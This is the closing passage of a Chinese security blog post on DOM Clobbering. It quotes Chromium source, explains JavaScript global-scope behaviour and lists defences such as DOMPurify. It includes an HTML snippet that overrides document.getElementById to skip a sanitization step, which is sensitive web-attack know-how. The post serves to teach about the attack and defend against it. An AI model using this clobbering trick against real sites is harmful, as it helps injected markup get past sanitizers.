</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>IsA</span><span class=o>&lt;</span><span class=n>HTMLFormElement</span><span class=o>&gt;</span><span class=p>(</span><span class=n>element</span><span class=p>)</span> <span class=o>||</span> <span class=n>IsA</span><span class=o>&lt;</span><span class=n>HTMLIFrameElement</span><span class=o>&gt;</span><span class=p>(</span><span class=n>element</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>      <span class=p>(</span><span class=n>html_embed_element</span> <span class=o>&amp;&amp;</span> <span class=n>html_embed_element</span><span class=o>-&gt;</span><span class=n>IsExposed</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>element</span><span class=p>.</span><span class=n>GetNameAttribute</span><span class=p>()</span> <span class=o>==</span> <span class=n>name_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>auto</span><span class=o>*</span> <span class=n>html_image_element</span> <span class=o>=</span> <span class=n>DynamicTo</span><span class=o>&lt;</span><span class=n>HTMLObjectElement</span><span class=o>&gt;</span><span class=p>(</span><span class=o>&amp;</span><span class=n>element</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>html_image_element</span> <span class=o>&amp;&amp;</span> <span class=n>html_image_element</span><span class=o>-&gt;</span><span class=n>IsExposed</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>element</span><span class=p>.</span><span class=n>GetNameAttribute</span><span class=p>()</span> <span class=o>==</span> <span class=n>name_</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>           <span class=n>element</span><span class=p>.</span><span class=n>GetIdAttribute</span><span class=p>()</span> <span class=o>==</span> <span class=n>name_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>IsA</span><span class=o>&lt;</span><span class=n>HTMLImageElement</span><span class=o>&gt;</span><span class=p>(</span><span class=n>element</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>AtomicString</span><span class=o>&amp;</span> <span class=n>name_value</span> <span class=o>=</span> <span class=n>element</span><span class=p>.</span><span class=n>GetNameAttribute</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>name_value</span> <span class=o>==</span> <span class=n>name_</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>           <span class=p>(</span><span class=n>element</span><span class=p>.</span><span class=n>GetIdAttribute</span><span class=p>()</span> <span class=o>==</span> <span class=n>name_</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>name_value</span><span class=p>.</span><span class=n>IsEmpty</span><span class=p>());</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=window-collection>Window Collection</h3><p>涉及到 Collection 的 Window 部分：</p><p><a class=link href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/window_name_collection.cc;l=22?originalUrl=https:%2F%2Fcs.chromium.org%2F" target=_blank rel=noopener>WindowNameCollection::ElementMatches</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>bool</span> <span class=n>WindowNameCollection</span><span class=o>::</span><span class=n>ElementMatches</span><span class=p>(</span><span class=k>const</span> <span class=n>Element</span><span class=o>&amp;</span> <span class=n>element</span><span class=p>)</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Match only images, forms, embeds and objects by name,
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// but anything by id
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=n>IsA</span><span class=o>&lt;</span><span class=n>HTMLImageElement</span><span class=o>&gt;</span><span class=p>(</span><span class=n>element</span><span class=p>)</span> <span class=o>||</span> <span class=n>IsA</span><span class=o>&lt;</span><span class=n>HTMLFormElement</span><span class=o>&gt;</span><span class=p>(</span><span class=n>element</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>      <span class=n>IsA</span><span class=o>&lt;</span><span class=n>HTMLEmbedElement</span><span class=o>&gt;</span><span class=p>(</span><span class=n>element</span><span class=p>)</span> <span class=o>||</span> <span class=n>IsA</span><span class=o>&lt;</span><span class=n>HTMLObjectElement</span><span class=o>&gt;</span><span class=p>(</span><span class=n>element</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>element</span><span class=p>.</span><span class=n>GetNameAttribute</span><span class=p>()</span> <span class=o>==</span> <span class=n>name_</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>element</span><span class=p>.</span><span class=n>GetIdAttribute</span><span class=p>()</span> <span class=o>==</span> <span class=n>name_</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=bouns>Bouns</h2><h3 id=tip-1-global-scope>Tip 1 Global Scope</h3><p>由于 Dom Clobbering 利用方式之一就是 hook 全局作用域下的变量，又由于 Javascript 是一门十分神奇的语言，所以我们需要注意如下几点</p><h4 id=显式声明>显式声明</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>b</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>c</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>a</span><span class=p>);</span>	<span class=c1>//1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>b</span><span class=p>);</span>	<span class=c1>//undefined
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>c</span><span class=p>);</span>	<span class=c1>//ƒ () {}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=隐式声明>隐式声明</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>test</span><span class=p>(</span><span class=nx>a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>b</span> <span class=o>=</span> <span class=nx>a</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>test</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>b</span><span class=p>);</span>	<span class=c1>//2
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>不带有<strong>声明关键字</strong>的变量，Javascript 会自动挂载到全局作用域上。</p><h4 id=let--var>let & var</h4><p>ES6 中新增了<code>let</code>命令，用来声明变量。它的用法类似于<code>var</code>，但是所声明的变量，只在<code>let</code>命令所在的代码块内有效。详细可以参考 <a class=link href=https://es6.ruanyifeng.com/#docs/let#%e5%9f%ba%e6%9c%ac%e7%94%a8%e6%b3%95 target=_blank rel=noopener>let 基本用法</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>b</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>a</span> <span class=c1>// ReferenceError: a is not defined.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>b</span> <span class=c1>// 1
</span></span></span></code></pre></td></tr></table></div></div><p>上面代码在代码块之中，分别用<code>let</code>和<code>var</code>声明了两个变量。然后在代码块之外调用这两个变量，结果<code>let</code>声明的变量报错，<code>var</code>声明的变量返回了正确的值。这表明，<code>let</code>声明的变量只在它所在的代码块有效。</p><p>而且有些很奇妙的操作，比如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=nx>b</span> <span class=o>=</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>a</span><span class=p>;</span>	<span class=c1>//undefined
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>window</span><span class=p>.</span><span class=nx>b</span><span class=p>;</span>	<span class=c1>//6
</span></span></span></code></pre></td></tr></table></div></div><h3 id=tip-2-overwrite-function>Tip 2 Overwrite function</h3><p>虽然可以 Clobber 函数，但是目前我没找到什么方法让他执行我们 Clobber 的结果，或者说目前貌似也没有办法通过标签来定义一个函数，所以只能是引起一个报错，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;getElementById&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;getElementById&#39;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>);</span>	<span class=c1>//Uncaught TypeError: document.getElementById is not a function
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>虽然只能引起报错，但是在一定场景下我们可以利用这个来绕过一些判断，例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;getElementById&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;getElementById&#39;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>);</span>	<span class=c1>//Uncaught TypeError: document.getElementById is not a function
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>//We must use sanitize a here.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=c1>//We have sanitized a. We can trust a now!
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>//Do something with a.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>第一个 JS 代码块虽然引起了报错，但是不会引起 JS 完全停止执行，JS 会跳过这个报错的代码块，执行下一个代码块。</p><h3 id=tip-3-prototype-pollution>Tip 3 Prototype Pollution</h3><p>原型链污染可以吗？</p><p>我目前尝试的方法还没成功，如果师傅尝试成功了一定要跟我分享！</p><h2 id=defence>Defence</h2><ol><li>最简单的是判断每个变量预期的类型以避免非预期类型的篡改，例如，可以检查 Dom 节点的 attribute 属性是否实际上是 NamedNodeMap 的实例，这样可以确保该属性是一个 attributes 属性，而不是攻击者插入的 HTMLElement。</li><li>毕竟这种攻击主要出现在全局变量这一块，所以代码规范十分重要！</li><li>使用经过测试的库，例如 DOMPurify 。</li></ol><h2 id=references>References</h2><p><a class=link href=https://www.blackhat.com/docs/us-15/materials/us-15-Nafeez-Dom-Flow-Untangling-The-DOM-For-More-Easy-Juicy-Bugs.pdf target=_blank rel=noopener>DOM FLOW UNTANGLING THE DOM FOR EASY BUGS</a></p><p><a class=link href=http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/ target=_blank rel=noopener>DOM Clobbering Attack</a></p><p><a class=link href=https://portswigger.net/research/dom-clobbering-strikes-back target=_blank rel=noopener>DOM Clobbering strikes back</a></p><p><a class=link href=http://www.thespanner.co.uk/2013/05/16/dom-clobbering/ target=_blank rel=noopener>DOM Clobbering</a></p><p><a class=link href=https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94 target=_blank rel=noopener>Clobbering the clobbered — Advanced DOM Clobbering</a></p><p><a class=link href=https://research.securitum.com/xss-in-amp4email-dom-clobbering/ target=_blank rel=noopener>XSS in GMail’s AMP4Email via DOM Clobbering</a></p><p>[DOM Clobbering Attack学习记录.md](<a class=link href=https://wonderkun.cc/2020/02/15/DOM target=_blank rel=noopener>https://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack学习记录)</p><p><a class=link href=https://cure53.de/dom target=_blank rel=noopener>Im DOM hört Dich keiner schreien</a></p><p><a class=link href=https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/ target=_blank rel=noopener>Dec 20: Sanitising HTML – the DOM clobbering issue</a></p><p><a class=link href=https://juejin.im/post/5abb99e9f265da2392366824 target=_blank rel=noopener>谈谈 JavaScript 的作用域</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/xss/>XSS</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/the-end-of-afr/><div class=article-details><h2 class=article-title>The End of AFR</h2></div></a></article><article><a href=/p/a-magic-way-of-xss-in-http/2/><div class=article-details><h2 class=article-title>A Magic Way of XSS in HTTP/2</h2></div></a></article><article><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/><div class=article-details><h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2></div></a></article><article><a href=/p/help-you-understand-http-smuggling-in-one-article/><div class=article-details><h2 class=article-title>Help you understand HTTP Smuggling in one article</h2></div></a></article><article><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-http-smuggling-%E6%94%BB%E5%87%BB/><div class=article-details><h2 class=article-title>一篇文章带你读懂 HTTP Smuggling 攻击</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/zeddyu/zeddyu.github.io///ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://googlefonts.zeddyu-lu.workers.dev/fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.3e39d12263b24e3c46a8d580c9ff2781500296e154ca0809820b5be9b9135220.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script></body></html>